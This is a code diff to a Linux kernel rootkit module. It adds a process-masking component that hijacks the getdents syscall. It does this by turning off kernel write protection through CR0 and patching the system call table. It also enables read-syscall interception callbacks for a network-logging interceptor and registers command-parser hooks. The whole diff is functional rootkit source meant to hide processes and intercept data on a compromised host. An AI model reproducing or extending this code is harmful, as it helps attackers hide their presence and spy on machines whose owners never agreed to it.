@@ -10,6 +10,7 @@
 #include "core.h"
 
 #include "netlog_interceptor.h"
+#include "process_masker.h"
 
 #define MOD_NAME "core"
 
@@ -19,14 +20,17 @@ static void disable_write_protect_mode(void);
 static void enable_write_protect_mode(void);
 
 asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);
+asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 struct rootkit_data *rk;
 
 static void init_rootkit_data(struct rootkit_data **data)
 {
 	*data = kzalloc(sizeof(struct rootkit_data), GFP_KERNEL);
-	INIT_LIST_HEAD(&(*data)->read_syscall_instrumenters);
 
+	INIT_LIST_HEAD(&(*data)->read_syscall_instrumenters);
+	INIT_LIST_HEAD(&(*data)->getdents_syscall_instrumenters);
+	INIT_LIST_HEAD(&(*data)->command_parsers);
 }
 
 static void load_modules(void)
@@ -35,6 +39,7 @@ static void load_modules(void)
 
 	/* NetLog-Interceptor */
 	interceptor_init(&(rk->original_syscalls));
+	process_masker_init(&(rk->original_syscalls));
 
 	printk(KERN_INFO MSG_PREF(MOD_NAME)"module loading finished\n");
 }
@@ -45,38 +50,22 @@ static int __init rootkit_start(void)
 
 	/* Initialize the rootkit structure */
 	init_rootkit_data(&rk);
-
 	disable_write_protect_mode();
 
 	rk->syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
 	rk->original_syscalls.read_syscall = (void *) rk->syscall_table[__NR_read];
+	rk->original_syscalls.getdents_syscall = (void *) rk->syscall_table[__NR_getdents];
+	
 	rk->syscall_table[__NR_read] = my_read_syscall;
+	rk->syscall_table[__NR_getdents] = my_getdents_syscall;
+
 
 	enable_write_protect_mode();
-
 	load_modules();
 
 	printk(KERN_INFO MSG_PREF(MOD_NAME)"Hello :)\n");
 
 	return 0;
-}
-
-void register_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret))
-{
-	struct read_syscall_instrumenter *rsi = kzalloc(sizeof(struct read_syscall_instrumenter), GFP_KERNEL);
-	rsi->callback = callback;
-	list_add(&(rsi->list), &(rk->read_syscall_instrumenters));
-}
-
-void deregister_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret))
-{
-	struct read_syscall_instrumenter *rsi = NULL;
-
-	list_for_each_entry(rsi, &(rk->read_syscall_instrumenters), list)
-		if (rsi->callback == callback) {
-			list_del(&(rsi->list));
-			break;
-		}
 }
 
 static void unload_modules(void)
@@ -85,6 +74,7 @@ static void unload_modules(void)
 
 	/* Interceptor-Netlogger */
 	interceptor_exit();
+	process_masker_exit();
 
 	printk(KERN_INFO MSG_PREF(MOD_NAME)"module unloading finished\n");
 }
@@ -99,8 +89,8 @@ static void __exit rootkit_exit(void)
 	disable_write_protect_mode();
 
 	/* Restore original syscalls */
-	//sys_call_table[__NR_getdents] = (int *) getdents_syscall;
 	rk->syscall_table[__NR_read] = rk->original_syscalls.read_syscall;
+	rk->syscall_table[__NR_getdents] = rk->original_syscalls.getdents_syscall;
 
 	enable_write_protect_mode();
 
@@ -133,21 +123,10 @@ static void enable_write_protect_mode(void)
 	write_cr0(original_cr0 | 0x00010000);
 }
 
-/*
-long call_each(unsigned int fd, char __user *buf, size_t count, long ret)
-{
-	struct read_syscall_instrumenters *rsi;
-	
-	list_for_each_entry(rsi, &(rk->read_syscall_instrumenters), list);
-		ret = rsi->callback(fd, buf, count, ret);
-}
-*/
-
 asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
-	struct read_syscall_intrumenter *rsi;
-	struct list_head *p;
+	struct read_syscall_instrumenter *rsi = NULL;
 
 	/* TODO insert command parsing logic here: */
 
@@ -155,16 +134,56 @@ asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 	ret = rk->original_syscalls.read_syscall(fd, buf, count);
 
 	/* Call all registered instrumenters */
-	//list_for_each_entry(rsi, &rk->read_syscall_instrumenters, list);
-	//		ret = rsi->callback(fd, buf, count, ret);
-
-//	list_for_each(p, &(rk->read_syscall_instrumenters)) {
-//		rsi = list_entry(p, struct read_syscall_instrumenter, list);
-//		ret = rsi->callback(fd, buf, count, ret);
-//	}
+	list_for_each_entry(rsi, &rk->read_syscall_instrumenters, list)
+		ret = rsi->callback(fd, buf, count, ret);
 
 	return ret;
 }
+
+asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
+	int ret;
+	struct getdents_syscall_instrumenter *gsi = NULL;
+
+	/* Call original getdents_syscall */
+	ret = rk->original_syscalls.getdents_syscall(fd, dirp, count);
+
+	/* Call all registered instrumenters */
+	list_for_each_entry(gsi, &rk->getdents_syscall_instrumenters, list)
+		ret = gsi->callback(fd, dirp, count, ret);
+
+	return ret;
+}
+
+REGISTER_HOOK(register_read_instrumenter,
+			  read_callback,
+			  struct read_syscall_instrumenter,
+			  rk->read_syscall_instrumenters);
+
+DEREGISTER_HOOK(deregister_read_instrumenter,
+				read_callback,
+				struct read_syscall_instrumenter,
+				rk->read_syscall_instrumenters);
+
+REGISTER_HOOK(register_getdents_instrumenter,
+			  getdents_callback,
+			  struct getdents_syscall_instrumenter,
+			  rk->getdents_syscall_instrumenters);
+
+DEREGISTER_HOOK(deregister_getdents_instrumenter,
+				getdents_callback,
+				struct getdents_syscall_instrumenter,
+				rk->getdents_syscall_instrumenters);
+
+REGISTER_HOOK(register_command_parser,
+			  command_callback,
+			  struct command_parser,
+			  rk->command_parsers);
+
+DEREGISTER_HOOK(deregister_command_parser,
+				command_callback,
+				struct command_parser,
+				rk->command_parsers);
 
 module_init(rootkit_start);
 module_exit(rootkit_exit);
